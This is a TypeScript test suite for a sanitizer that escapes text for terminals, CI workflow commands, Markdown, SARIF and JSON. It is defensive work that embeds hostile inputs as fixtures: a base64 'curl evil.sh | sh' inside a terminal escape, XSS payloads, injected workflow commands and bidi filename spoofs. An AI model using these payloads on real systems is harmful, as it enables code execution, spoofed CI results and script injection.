import fc from 'fast-check';
import { describe, expect, it } from 'vitest';
import {
  codePointLabel,
  forJsonOutput,
  forMarkdown,
  forSarifMessage,
  forSarifText,
  forTerminal,
  forWorkflowCommand,
  forWorkflowProperty,
  guardWorkflowCommands,
} from '../../src/report/sanitize.js';
import { HOSTILE, type HostileName } from './hostile.js';
import { hostileText, parseWorkflowCommand, unescapeData, unsafeCodePoints } from './safety.js';

/** Builds strings from code points, so no invisible character appears raw in this file. */
const c = (...codePoints: number[]): string => String.fromCodePoint(...codePoints);

const MARKDOWN_META = new Set([
  '\\',
  '`',
  '*',
  '_',
  '[',
  ']',
  '(',
  ')',
  '|',
  '~',
  '$',
  '!',
  ':',
  '#',
]);

/** Markdown metacharacters that are not backslash-escaped (entities skipped). */
function unescapedMarkdown(markdown: string): string[] {
  const found: string[] = [];
  for (let index = 0; index < markdown.length; index++) {
    const ch = markdown.charAt(index);
    if (ch === '\\') {
      index++;
      continue;
    }
    if (ch === '&') {
      const entity = /^&(?:[a-z]+|#\d+);/.exec(markdown.slice(index));
      if (entity) {
        index += entity[0].length - 1;
        continue;
      }
    }
    if (MARKDOWN_META.has(ch)) found.push(ch);
  }
  return found;
}

/** Square brackets in a SARIF message that are not backslash-escaped. */
function unescapedBrackets(message: string): string[] {
  const found: string[] = [];
  for (let index = 0; index < message.length; index++) {
    const ch = message.charAt(index);
    if (ch === '\\') index++;
    else if (ch === '[' || ch === ']') found.push(ch);
  }
  return found;
}

/** Every channel's guarantees for one input. */
function checkAllChannels(text: string): void {
  // Terminal
  expect(unsafeCodePoints(forTerminal(text), { tab: true })).toEqual([]);
  expect(unsafeCodePoints(forTerminal(text, { ascii: true }), { tab: true })).toEqual([]);
  const multiline = forTerminal(text, { multiline: true });
  expect(unsafeCodePoints(multiline, { tab: true, newline: true })).toEqual([]);

  // Workflow commands: one line, parsed back exactly as the runner would.
  const data = forWorkflowCommand(text);
  const property = forWorkflowProperty(text);
  expect(data).not.toMatch(/[\n\r]/);
  expect(property).not.toMatch(/[\n\r:,]/);
  expect(unescapeData(data)).toBe(multiline);
  const parsed = parseWorkflowCommand(`::warning file=${property},title=${property}::${data}`);
  expect(parsed.command).toBe('warning');
  expect(Object.keys(parsed.properties)).toEqual(['file', 'title']);
  expect(parsed.properties['file']).toBe(forTerminal(text));
  expect(parsed.data).toBe(multiline);

  // Markdown
  const markdown = forMarkdown(text);
  expect(unsafeCodePoints(markdown, { tab: true })).toEqual([]);
  expect(markdown).not.toMatch(/[\n\r<>]/);
  expect(markdown).not.toMatch(/@[\p{L}\p{N}]/u);
  expect(markdown).not.toMatch(/(?<!&)#\d/);
  expect(markdown).not.toMatch(/javascript:/i);
  expect(unescapedMarkdown(markdown)).toEqual([]);

  // SARIF
  expect(unsafeCodePoints(forSarifText(text), { tab: true })).toEqual([]);
  expect(
    unsafeCodePoints(forSarifText(text, { multiline: true }), { tab: true, newline: true }),
  ).toEqual([]);
  const message = forSarifMessage(text);
  expect(unsafeCodePoints(message, { tab: true })).toEqual([]);
  expect(unescapedBrackets(message)).toEqual([]);

  // JSON: lossless and display-safe.
  const json = forJsonOutput(JSON.stringify({ text }));
  expect((JSON.parse(json) as { text: string }).text).toBe(text);
  expect(unsafeCodePoints(json)).toEqual([]);
}

describe('every channel', () => {
  it.each(Object.keys(HOSTILE) as HostileName[])('neutralizes %s', (name) => {
    checkAllChannels(HOSTILE[name]);
  });

  it('neutralizes arbitrary text, lone surrogates included (property-based)', () => {
    fc.assert(
      fc.property(hostileText, (text) => {
        checkAllChannels(text);
      }),
      { numRuns: 500 },
    );
  });
});

describe('forTerminal', () => {
  it('renders controls visibly, so ESC can never start an escape sequence', () => {
    expect(forTerminal(HOSTILE.osc52Clipboard)).toBe(
      'copy<U+001B>]52;c;Y3VybCBldmlsLnNoIHwgc2g=<U+0007>done',
    );
    expect(forTerminal(HOSTILE.clearScreen)).toBe('<U+001B>[2J<U+001B>[Hcleared');
    expect(forTerminal(HOSTILE.c1Csi)).toBe('eight-bit <U+009B>31mCSI<U+009B>0m and NEL<U+0085>');
    expect(forTerminal(HOSTILE.nulAndDel)).toBe('nul<U+0000>del<U+007F>bell<U+0007>bs<U+0008>');
  });

  it('renders each line break as one marker in single-line mode', () => {
    expect(forTerminal('a\nb\r\nc\rd')).toBe('a⏎b⏎c⏎d');
    expect(forTerminal(HOSTILE.carriageReturn)).toBe('safe text⏎FAKE: all checks passed');
    expect(forTerminal('a\r\nb', { ascii: true })).toBe('a\\nb');
  });

  it('normalizes line breaks to LF in multi-line mode', () => {
    expect(forTerminal('a\r\nb\rc\nd', { multiline: true })).toBe('a\nb\nc\nd');
  });

  it('keeps TAB and printable text', () => {
    expect(forTerminal(HOSTILE.tab)).toBe('tab\there');
    expect(forTerminal('plain ASCII ~')).toBe('plain ASCII ~');
    expect(forTerminal('Ünïcödé 设置文件过大 ⏎')).toBe('Ünïcödé 设置文件过大 ⏎');
  });

  it('renders bidi controls, zero-width characters and tags visibly', () => {
    expect(forTerminal(HOSTILE.bidiOverride)).toBe(
      'invoice<U+202E>txt.exe and <U+202A>embed<U+202C> <U+200E><U+200F><U+061C>',
    );
    expect(forTerminal(HOSTILE.bidiIsolates)).toBe(
      '<U+2066>isolated<U+2069> <U+2067>rtl<U+2069> <U+2068>fs<U+2069>',
    );
    expect(forTerminal(HOSTILE.zeroWidth)).toBe(
      'zero<U+200B>width<U+200C>non<U+200D>joiner<U+2060>word<U+FEFF>bom',
    );
    expect(forTerminal(HOSTILE.tags)).toBe('tags<U+E0001><U+E0049><U+E0067><U+E006E><U+E007F>end');
    expect(forTerminal(HOSTILE.lineSeparators)).toBe('ls<U+2028>ps<U+2029>');
    expect(forTerminal(c(0xad, 0x34f, 0x115f, 0x3164, 0xfff9, 0x1d173, 0xffff))).toBe(
      '<U+00AD><U+034F><U+115F><U+3164><U+FFF9><U+1D173><U+FFFF>',
    );
  });

  it('renders lone surrogates visibly', () => {
    expect(forTerminal(HOSTILE.loneSurrogates)).toBe('lone <U+D800> high and <U+DC00> low');
    expect(forTerminal('\uDBFF')).toBe('<U+DBFF>');
  });

  it('keeps emoji sequences: presentation selectors, skin tones, ZWJ, keycaps', () => {
    expect(forTerminal(HOSTILE.emoji)).toBe(HOSTILE.emoji);
  });

  it('escapes variation selectors outside emoji context and smuggled runs', () => {
    expect(forTerminal(HOSTILE.variationSelectors)).toBe(
      `plain<U+FE0F> text<U+FE0E> and smuggled 😀${c(0xfe0f)}<U+FE0F><U+E0100><U+E0101>`,
    );
    expect(forTerminal(`${c(0xfe0f)}x`)).toBe('<U+FE0F>x');
    expect(forTerminal(`1${c(0xfe0f)}`)).toBe('1<U+FE0F>');
  });

  it('escapes ZWJ that does not join two emoji', () => {
    expect(forTerminal(`a${c(0x200d)}b`)).toBe('a<U+200D>b');
    expect(forTerminal(`😀${c(0x200d)}`)).toBe('😀<U+200D>');
    expect(forTerminal(`😀${c(0x200d, 0x200d)}😀`)).toBe('😀<U+200D><U+200D>😀');
    expect(forTerminal(`a${c(0xfe0f, 0x200d)}😀`)).toBe('a<U+FE0F><U+200D>😀');
    expect(forTerminal(`👍${c(0x1f3fd, 0x200d)}😀`)).toBe(`👍${c(0x1f3fd, 0x200d)}😀`);
  });
});

describe('codePointLabel', () => {
  it('pads to four upper-case hex digits', () => {
    expect(codePointLabel(0x1b)).toBe('<U+001B>');
    expect(codePointLabel(0xe0041)).toBe('<U+E0041>');
  });
});

describe('workflow commands', () => {
  // Reference implementation copied from @actions/core packages/core/src/command.ts.
  const actionsEscapeData = (text: string) =>
    text.replace(/%/g, '%25').replace(/\r/g, '%0D').replace(/\n/g, '%0A');
  const actionsEscapeProperty = (text: string) =>
    actionsEscapeData(text).replace(/:/g, '%3A').replace(/,/g, '%2C');

  it('equals @actions/core escaping once controls are neutralized', () => {
    for (const text of ['100% done', 'a:b,c', 'multi\nline', '%0A literal', 'ünï 设置', '']) {
      expect(forWorkflowCommand(text)).toBe(actionsEscapeData(text));
      const single = text.replaceAll('\n', ' ');
      expect(forWorkflowProperty(single)).toBe(actionsEscapeProperty(single));
    }
  });

  it('cannot start a new command line', () => {
    expect(forWorkflowCommand(HOSTILE.stopCommands)).toBe('line one%0A::stop-commands::x');
    expect(forWorkflowCommand(HOSTILE.fakeError)).toBe('line one%0A::error::fake annotation');
    expect(forWorkflowCommand(HOSTILE.addMask)).toBe(
      'x%0A::add-mask::secret%0A::set-output name=a::b',
    );
    expect(forWorkflowCommand(HOSTILE.carriageReturn)).toBe('safe text%0AFAKE: all checks passed');
    expect(forWorkflowCommand(HOSTILE.percentEscapes)).toBe('100%25 done %250A %2525 a:b,c=d');
  });

  it('escapes property delimiters and keeps properties single-line', () => {
    expect(forWorkflowProperty('a::b,title=x\n')).toBe('a%3A%3Ab%2Ctitle=x⏎');
    expect(forWorkflowProperty('evil\u001b[31m.md')).toBe('evil<U+001B>[31m.md');
  });
});

describe('guardWorkflowCommands', () => {
  it('defuses lines whose first non-blank characters are "::", visibly', () => {
    expect(guardWorkflowCommands('::error::x\n  ::warning file=a::b\nok :: fine\n')).toBe(
      '<U+003A>:error::x\n  <U+003A>:warning file=a::b\nok :: fine\n',
    );
    expect(guardWorkflowCommands(' 　::stop-commands::t')).toBe(' 　<U+003A>:stop-commands::t');
  });

  it('leaves other text alone', () => {
    for (const text of ['', 'no colons', 'a::b', ': :x', '\u001b[4m::styled', 'x\n:y']) {
      expect(guardWorkflowCommands(text)).toBe(text);
    }
  });

  it('leaves no line the runner parses as a command, for any input', () => {
    fc.assert(
      fc.property(fc.array(fc.oneof(hostileText, fc.constant('::'), fc.constant(' '))), (parts) => {
        const output = guardWorkflowCommands(parts.map((part) => forTerminal(part)).join('\n'));
        for (const line of output.split('\n')) {
          expect(line.trimStart().startsWith('::')).toBe(false);
        }
      }),
    );
  });
});

describe('forMarkdown', () => {
  it('turns HTML into entities', () => {
    expect(forMarkdown(HOSTILE.html)).toBe(
      '&lt;img src=x onerror=alert\\(1\\)&gt; &lt;script&gt;alert\\(1\\)&lt;/script&gt; &amp;lt;b&amp;gt;',
    );
  });

  it('escapes link, image and autolink syntax', () => {
    expect(forMarkdown(HOSTILE.links)).toBe(
      '\\[click\\]\\(javascript\\:alert\\(1\\)\\) \\!\\[x\\]\\(https\\://evil\\.example/p\\.png\\) &lt;https\\://evil\\.example&gt;',
    );
    expect(forMarkdown(HOSTILE.autolinks)).toBe(
      'https\\://evil\\.example www\\.evil\\.example javascript\\:alert\\(1\\)',
    );
  });

  it('neutralizes mentions and issue references', () => {
    expect(forMarkdown(HOSTILE.mentions)).toBe(
      'ping @&#8203;octocat and @&#8203;github/security\\-team, mail me@&#8203;example\\.com',
    );
    expect(forMarkdown(HOSTILE.issueRefs)).toBe(
      'closes \\#&#8203;1, GH\\-&#8203;2 and owner/repo\\#&#8203;3',
    );
    expect(forMarkdown('# not a ref, gh-x, a-1')).toBe('\\# not a ref, gh\\-x, a\\-1');
  });

  it('escapes table pipes and emphasis', () => {
    expect(forMarkdown(HOSTILE.tablePipes)).toBe('a \\| b \\|\\| c \\\\\\| d');
    expect(forMarkdown(HOSTILE.markdownSyntax)).toBe(
      '\\# heading \\*em\\* \\*\\*strong\\*\\* \\`code\\` \\~\\~del\\~\\~ \\$x\\$ &gt; quote \\- item 1\\. item',
    );
  });

  it('renders invisible characters and line breaks visibly', () => {
    expect(forMarkdown('a\u001b[2Jb\nc')).toBe('a&lt;U\\+001B&gt;\\[2Jb⏎c');
    expect(forMarkdown(HOSTILE.bidiOverride)).toBe(
      'invoice&lt;U\\+202E&gt;txt\\.exe and &lt;U\\+202A&gt;embed&lt;U\\+202C&gt; &lt;U\\+200E&gt;&lt;U\\+200F&gt;&lt;U\\+061C&gt;',
    );
  });
});

describe('SARIF text', () => {
  it('neutralizes controls and keeps line breaks only in multi-line mode', () => {
    expect(forSarifText('a\u001bb\r\nc')).toBe('a<U+001B>b⏎c');
    expect(forSarifText('a\r\nb', { multiline: true })).toBe('a\nb');
  });

  it('escapes brackets in messages so no embedded link can be formed', () => {
    expect(forSarifMessage(HOSTILE.sarifLink)).toBe(
      'see \\[here\\](1) and \\\\\\[escaped\\\\\\] \\\\\\',
    );
    expect(forSarifMessage('C:\\path and \\n')).toBe('C:\\path and \\n');
  });
});

describe('forJsonOutput', () => {
  it('escapes DEL, C1, bidi, invisible and tag characters losslessly', () => {
    const value = `a\u007f${c(0x9b, 0x202e, 0x200b, 0xe0041)}😀`;
    const json = forJsonOutput(JSON.stringify(value));
    expect(json).toBe('"a\\u007f\\u009b\\u202e\\u200b\\udb40\\udc41😀"');
    expect(JSON.parse(json)).toBe(value);
  });

  it('keeps JSON.stringify escapes for C0 and lone surrogates', () => {
    expect(forJsonOutput(JSON.stringify('\u001b\uD800'))).toBe('"\\u001b\\ud800"');
  });
});
